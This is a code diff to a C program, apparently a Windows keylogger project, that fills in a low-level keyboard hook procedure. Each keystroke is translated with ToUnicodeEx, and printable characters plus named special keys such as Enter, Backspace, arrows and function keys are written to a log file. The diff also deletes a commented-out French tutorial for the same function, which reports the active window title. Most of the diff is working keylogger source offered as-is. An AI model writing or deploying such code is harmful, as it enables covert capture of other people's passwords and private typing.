@@ -1,6 +1,7 @@
 #include "winkey.h"
 
-HHOOK g_Hook = NULL;
+HHOOK g_Hook    = NULL;
+WCHAR BUFFER[8] = {0};
 
 bool    Keylogger(void)
 {
@@ -28,8 +29,80 @@ LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
     lParam -> Pointer to a struct KBDLLHOOKSTRUCT
 */
 {
+    if (code >= 0)
+    {
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+        {
+            KBDLLHOOKSTRUCT*    kb = (KBDLLHOOKSTRUCT *)lParam;
+            DWORD   VirtualKeyCode = kb->vkCode;
+            
+            BYTE    keyboardState[256] = {0};
+            GetKeyboardState(keyboardState);
 
-    printf("Key was pressed\n");
+            int res = ToUnicodeEx(VirtualKeyCode,
+                                  kb->scanCode,
+                                  keyboardState,
+                                  BUFFER,
+                                  2,
+                                  0,
+                                  GetKeyboardLayout(0));
+            
+            if (res == 0)
+            {
+                char* specialKey = NULL;
+                
+                switch (VirtualKeyCode)
+                {
+                    case VK_RETURN:    specialKey = _strdup("\n");    break;
+                    case VK_BACK:      specialKey = _strdup("BACK");  break;
+                    case VK_SPACE:     specialKey = _strdup(" ");     break;
+                    case VK_TAB:       specialKey = _strdup("\t");    break;
+                    case VK_SHIFT:     specialKey = _strdup("SHIFT"); break;
+                    case VK_CONTROL:   specialKey = _strdup("CTRL");  break;
+                    case VK_LCONTROL:  specialKey = _strdup("LCTRL"); break;
+                    case VK_RCONTROL:  specialKey = _strdup("RCTRL"); break;
+                    case VK_LEFT:      specialKey = _strdup("LEFT");  break;
+                    case VK_RIGHT:     specialKey = _strdup("RIGHT"); break;
+                    case VK_UP:        specialKey = _strdup("UP");    break;
+                    case VK_DOWN:      specialKey = _strdup("DOWN");  break;
+                    case VK_DELETE:    specialKey = _strdup("DEL");   break;
+                    case VK_INSERT:    specialKey = _strdup("INS");   break;
+                    case VK_HOME:      specialKey = _strdup("HOME");  break;
+                    case VK_END:       specialKey = _strdup("END");   break;
+                    case VK_NEXT:      specialKey = _strdup("PGDN");  break;
+                    case VK_ESCAPE:    specialKey = _strdup("ESC");   break;
+                    case VK_CAPITAL:   specialKey = _strdup("CAPS");  break;
+                    case VK_NUMLOCK:   specialKey = _strdup("NUMLOCK"); break;
+                    case VK_F1:        specialKey = _strdup("F1");    break;
+                    case VK_F2:        specialKey = _strdup("F2");    break;
+                    case VK_F3:        specialKey = _strdup("F3");    break;
+                    case VK_F4:        specialKey = _strdup("F4");    break;
+                    case VK_F5:        specialKey = _strdup("F5");    break;
+                    case VK_F6:        specialKey = _strdup("F6");    break;
+                    case VK_F7:        specialKey = _strdup("F7");    break;
+                    case VK_F8:        specialKey = _strdup("F8");    break;
+                    case VK_F9:        specialKey = _strdup("F9");    break;
+                    case VK_F10:       specialKey = _strdup("F10");   break;
+                    case VK_F11:       specialKey = _strdup("F11");   break;
+                    case VK_F12:       specialKey = _strdup("F12");   break;
+                }
+
+                if (specialKey != NULL)
+                {
+                    printf("|%s|", specialKey);
+                    fwrite(specialKey, strlen(specialKey), 1, LogFile);
+                    free(specialKey);
+                }
+            }
+
+            else if (res > 0)
+            {
+                printf("%ls", BUFFER);
+                fwrite((const char *)BUFFER, strlen((const char *)BUFFER), 1, LogFile);
+            }
+        }
+    }
+
     return CallNextHookEx(g_Hook, code, wParam, lParam);
 }
 
@@ -70,73 +143,6 @@ void    RemoveKeyHook(void)
 // }   MSG;
 
 
-
-// # Compléter la fonction KeyboardProc pour afficher les touches
-
-// Voici comment vous pouvez compléter la fonction KeyboardProc pour capturer et afficher les touches pressées dans le terminal :
-
-// ```c
-// LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
-// {
-//     if (code >= 0)  // Si le code est négatif, on doit passer le message sans traitement
-//     {
-//         // On ne traite que les appuis de touches (pas les relâchements)
-//         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
-//         {
-//             KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
-//             DWORD vkCode = kbStruct->vkCode;
-            
-//             // Buffer pour stocker le caractère traduit
-//             WCHAR buffer[8] = {0};
-            
-//             // Récupérer l'état du clavier
-//             BYTE keyboardState[256] = {0};
-//             GetKeyboardState(keyboardState);
-            
-//             // Convertir le code de touche virtuelle en caractère
-//             int result = ToUnicodeEx(
-//                 vkCode,
-//                 kbStruct->scanCode,
-//                 keyboardState,
-//                 buffer,
-//                 8,
-//                 0,
-//                 GetKeyboardLayout(0)
-//             );
-            
-//             // Si la touche a été traduite avec succès
-//             if (result > 0)
-//             {
-//                 printf("Touche: %ls\n", buffer);
-//             }
-//             // Gestion des touches spéciales non traduisibles en caractères
-//             else
-//             {
-//                 char* specialKey = NULL;
-                
-//                 switch (vkCode)
-//                 {
-//                     case VK_RETURN:    specialKey = "ENTER"; break;
-//                     case VK_BACK:      specialKey = "BACKSPACE"; break;
-//                     case VK_SPACE:     specialKey = "SPACE"; break;
-//                     case VK_TAB:       specialKey = "TAB"; break;
-//                     case VK_ESCAPE:    specialKey = "ESCAPE"; break;
-//                     case VK_SHIFT:     specialKey = "SHIFT"; break;
-//                     case VK_CONTROL:   specialKey = "CTRL"; break;
-//                     case VK_MENU:      specialKey = "ALT"; break;
-//                     case VK_DELETE:    specialKey = "DELETE"; break;
-//                     case VK_LEFT:      specialKey = "LEFT"; break;
-//                     case VK_RIGHT:     specialKey = "RIGHT"; break;
-//                     case VK_UP:        specialKey = "UP"; break;
-//                     case VK_DOWN:      specialKey = "DOWN"; break;
-//                     case VK_F1:        specialKey = "F1"; break;
-//                     // Vous pouvez ajouter plus de touches spéciales ici
-//                     default:
-//                         specialKey = "UNKNOWN";
-//                 }
-                
-//                 printf("Touche spéciale: [%s]\n", specialKey);
-//             }
             
 //             // Afficher le nom de la fenêtre active
 //             HWND foregroundWindow = GetForegroundWindow();
@@ -147,20 +153,7 @@ void    RemoveKeyHook(void)
 //                 printf("Fenêtre active: %s\n", windowTitle);
 //                 printf("---------------------------\n");
 //             }
-            
-//             // Pour sortir proprement (par exemple avec ESCAPE)
-//             if (vkCode == VK_ESCAPE)
-//             {
-//                 printf("Sortie du programme demandée (touche ESCAPE)\n");
-//                 PostQuitMessage(0);  // Cette ligne fait sortir de la boucle GetMessage
-//             }
-//         }
-//     }
-    
-//     // Toujours passer le message au hook suivant
-//     return CallNextHookEx(g_Hook, code, wParam, lParam);
-// }
-// ```
+
 
 // ## Explications détaillées
 
